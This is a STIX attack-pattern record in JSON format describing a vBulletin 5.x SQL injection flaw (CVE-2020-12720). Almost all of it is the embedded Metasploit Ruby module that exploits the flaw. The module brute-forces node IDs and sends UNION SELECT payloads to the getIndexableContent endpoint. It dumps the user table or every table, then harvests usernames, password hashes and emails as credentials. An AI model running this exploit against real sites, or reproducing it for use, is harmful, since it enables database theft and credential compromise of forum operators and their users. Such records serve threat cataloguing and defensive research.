{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04cdfd1e-8567-43b5-a84d-40aff4614afb",
    "created": "2024-08-14T16:32:36.392367Z",
    "modified": "2024-08-14T16:32:36.392371Z",
    "name": "vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection",
    "description": " This module exploits a SQL injection vulnerability found in vBulletin 5.x.x to dump the user table information or to dump all of the vBulletin tables (based on the selected options). This module has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/vbulletin_getindexablecontent_sqli.rb",
            "external_id": "vbulletin_getindexablecontent_sqli.rb"
        },
        {
            "source_name": "CharlesFol<folcharlesatgmail.com>",
            "external_id": "#(@cfreal_)CVE"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12720"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  HttpFingerprint = { method: 'GET', uri: '/', pattern: [/vBulletin.version = '5.+'/] }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection',\n        'Description' => %q{\n          This module exploits a SQL injection vulnerability found in vBulletin 5.x.x to dump the user\n          table information or to dump all of the vBulletin tables (based on the selected options). This\n          module has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Charles Fol <folcharles[at]gmail.com>', # (@cfreal_) CVE\n          'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-12720']\n        ],\n        'Actions' => [\n          ['DumpUser', { 'Description' => 'Dump only user table used by vbulletin.' }],\n          ['DumpAll', { 'Description' => 'Dump all tables used by vbulletin.' }]\n        ],\n        'DefaultAction' => 'DumpUser',\n        'DisclosureDate' => '2020-03-12',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to vBulletin', '/']),\n      OptInt.new('NODE', [false, 'Valid Node ID']),\n      OptInt.new('MINNODE', [true, 'Valid Node ID', 1]),\n      OptInt.new('MAXNODE', [true, 'Valid Node ID', 200]),\n    ])\n  end\n\n  # Performs SQLi attack\n  def do_sqli(node_id, tbl_prfx, field, table, condition = nil, limit = nil)\n    where_cond = condition.nil? || condition == '' ? '' : \"where #{condition}\"\n    limit_cond = limit.nil? || limit == '' ? '' : \"limit #{limit}\"\n    injection = \" UNION ALL SELECT 0x2E,0x74,0x68,0x65,0x2E,0x65,0x78,0x70,0x6C,0x6F,0x69,0x74,0x65,0x65,0x72,0x73,0x2E,#{field},0x2E,0x7A,0x65,0x6E,0x6F,0x66,0x65,0x78 \"\n    injection << \"from #{tbl_prfx}#{table} #{where_cond} #{limit_cond} --\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'content_infraction', 'getIndexableContent'),\n      'vars_post' => {\n        'nodeId[nodeid]' => \"#{node_id}#{injection}\"\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['rawtext']\n\n    parsed_resp['rawtext']\n  end\n\n  # Gets the prefix to the SQL tables used in vbulletin install\n  def get_table_prefix(node_id)\n    print_status('Attempting to determine the vBulletin table prefix.')\n    table_name = do_sqli(node_id, '', 'table_name', 'information_schema.columns', \"column_name='phrasegroup_cppermission'\")\n\n    unless table_name && table_name.split('language').index\n      fail_with(Failure::Unknown, 'Could not determine the vBulletin table prefix.')\n    end\n\n    table_prfx = table_name.split('language')[0]\n    print_good(\"Sucessfully retrieved table to get prefix from #{table_name}.\")\n\n    table_prfx\n  end\n\n  # Brute force a nodeid (attack requires a valid nodeid)\n  def brute_force_node\n    min = datastore['MINNODE']\n    max = datastore['MAXNODE']\n\n    if min > max\n      print_error(\"MINNODE can't be major than MAXNODE.\")\n      return nil\n    end\n\n    for node_id in min..max\n      if exists_node?(node_id)\n        return node_id\n      end\n    end\n\n    nil\n  end\n\n  # Checks if a nodeid is valid\n  def exists_node?(id)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'node', 'getNode'),\n      'vars_post' => {\n        'nodeid' => id.to_s\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']\n\n    print_good(\"Sucessfully found node at id #{id}\")\n    true\n  end\n\n  # Gets a node through BF or user supplied value\n  def get_node\n    if datastore['NODE'].nil? || datastore['NODE'] <= 0\n      print_status('Brute forcing to find a valid node id.')\n      return brute_force_node\n    end\n\n    print_status(\"Checking node id '#{datastore['NODE']}'.\")\n    return datastore['NODE'] if exists_node?(datastore['NODE'])\n\n    nil\n  end\n\n  # Report credentials to MSF DB\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: ssl ? 'https' : 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user]\n    }.merge(service_data)\n\n    if opts[:password]\n      credential_data.merge!(\n        private_data: opts[:password],\n        private_type: :nonreplayable_hash,\n        jtr_format: 'bcrypt'\n      )\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: opts[:status],\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Get columns for table\n  def get_table_columns(node_id, table_prfx, table)\n    print_status(\"Getting table columns for #{table_prfx}#{table}\")\n    columns_cnt = do_sqli(node_id, '', 'COUNT(COLUMN_NAME)', 'INFORMATION_SCHEMA.COLUMNS', \"TABLE_NAME='#{table_prfx}#{table}'\")\n    fail_with(Failure::UnexpectedReply, \"Could not get count of columns for #{table_prfx}#{table}.\") unless columns_cnt\n\n    columns = []\n    for idx in 0..columns_cnt.to_i\n      column = do_sqli(node_id, '', 'COLUMN_NAME', 'INFORMATION_SCHEMA.COLUMNS', \"TABLE_NAME='#{table_prfx}#{table}'\", \"#{idx}, #{idx + 1}\")\n      columns << column\n    end\n    print_good(\"Retrieved #{columns_cnt} columns for #{table_prfx}#{table}\")\n\n    columns\n  end\n\n  # Gets rows from table\n  def get_all_rows(node_id, table_prfx, table, columns)\n    print_status(\"Dumping table #{table_prfx}#{table}\")\n    field_var = 'concat('\n    columns.each do |col|\n      if !col.blank?\n        field_var << \"COALESCE(#{col},''),0x7C,\"\n      end\n    end\n    field_var << '\\'\\')'\n\n    row_cnt = do_sqli(node_id, table_prfx, 'COUNT(*)', \"#{table_prfx}#{table}\")\n    if row_cnt.nil? || row_cnt.to_i < 0\n      print_status('Table contains 0 rows, skipping.')\n      return nil\n    end\n    print_status(\"Table contains #{row_cnt} rows, dumping (this may take a while).\")\n\n    rows = []\n    for r_idx in 0..row_cnt.to_i - 1\n      field_hash = {}\n      fields = do_sqli(node_id, table_prfx, field_var.to_s, \"#{table_prfx}#{table}\", '', \"#{r_idx}, #{r_idx + 1}\")\n      field_list = fields.split('|')\n      field_list.each_with_index do |field, f_idx|\n        field_hash[columns[f_idx.to_i]] = field.to_s\n      end\n\n      unless field_hash['username'].blank? && table != /user/\n        print_good(\"Found credential: #{field_hash['username']}:#{field_hash['token']} (Email: #{field_hash['email']})\")\n        report_cred(\n          ip: rhost,\n          port: datastore['RPORT'],\n          user: field_hash['username'].to_s,\n          password: field_hash['token'].to_s,\n          status: Metasploit::Model::Login::Status::UNTRIED,\n          jtr_format: 'bcrypt',\n          proof: field_hash.to_s\n        )\n      end\n\n      rows << field_hash\n    end\n    print_good(\"Retrieved #{row_cnt} rows for #{table_prfx}#{table}\")\n\n    rows\n  end\n\n  # Get all tables in database with prefix\n  def get_all_tables(node_id, table_prfx)\n    print_status('Dumping all table names from INFORMATION_SCHEMA')\n    table_cnt = do_sqli(node_id, '', 'COUNT(TABLE_NAME)', 'INFORMATION_SCHEMA.TABLES', \"TABLE_NAME like '#{table_prfx}%'\")\n    fail_with(Failure::UnexpectedReply, \"Could not get count of tables with prefix: #{table_prfx}.\") unless table_cnt\n\n    tables = []\n    for idx in 0..table_cnt.to_i\n      table = do_sqli(node_id, '', 'TABLE_NAME', 'INFORMATION_SCHEMA.TABLES', \"TABLE_NAME like '#{table_prfx}%'\", \"#{idx}, #{idx + 1}\")\n      tables << table\n    end\n    print_good(\"Retrieved #{table_cnt} tables for #{table_prfx}\")\n\n    tables\n  end\n\n  # Stores table data to file on disk\n  def store_data(data, name)\n    path = store_loot(name, 'text/plain', datastore['RHOST'], data.to_json, name)\n    print_good(\"Saved file to: #{path}\")\n  end\n\n  # Performs all sql injection functionality\n  def run\n    # Get node_id for requests\n    node_id = get_node\n    fail_with(Failure::Unknown, 'Could not get a valid node id for the vBulletin install.') unless node_id\n\n    # Get vBulletin table prefix (from known vb table 'language')\n    table_prfx = get_table_prefix(node_id)\n\n    tables = action.name == 'DumpAll' ? get_all_tables(node_id, table_prfx) : [\"#{table_prfx}user\"]\n    tables.each do |table|\n      columns = get_table_columns(node_id, '', table)\n      rows = get_all_rows(node_id, '', table, columns)\n      store_data(rows, table.to_s) unless rows.nil?\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-12"
}